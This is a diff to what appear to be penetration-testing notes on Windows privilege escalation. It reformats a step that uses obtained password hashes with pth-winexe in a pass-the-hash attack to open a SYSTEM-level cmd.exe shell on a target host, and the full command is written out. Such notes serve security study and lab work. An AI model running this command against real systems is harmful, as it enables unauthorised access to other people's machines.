@@ -127,8 +127,14 @@ C:\Windows\System32\config\RegBack
 
 Once hashes are obtained, in either ways we can spwan a cmd.exe
 1. Crack the hashes and use winexe to spawn a shell
-2. Use pth-winexe --system -U '<Username>%aad3b435b51404eeaad3b435b51404ee:<Users Hash>' //192.168.X.X cmd.exe
-  --system - To spwan system (admin) shell
-  Without --system, it could be normal user shell.
+2. Use pth-winexe 
+
+--system - To spwan system (admin) shell
+Without --system, it could be normal user shell.
+  
+```
+pth-winexe --system -U '<Username>%aad3b435b51404eeaad3b435b51404ee:<Users Hash>' //192.168.X.X cmd.exe
+```
+  
   
   
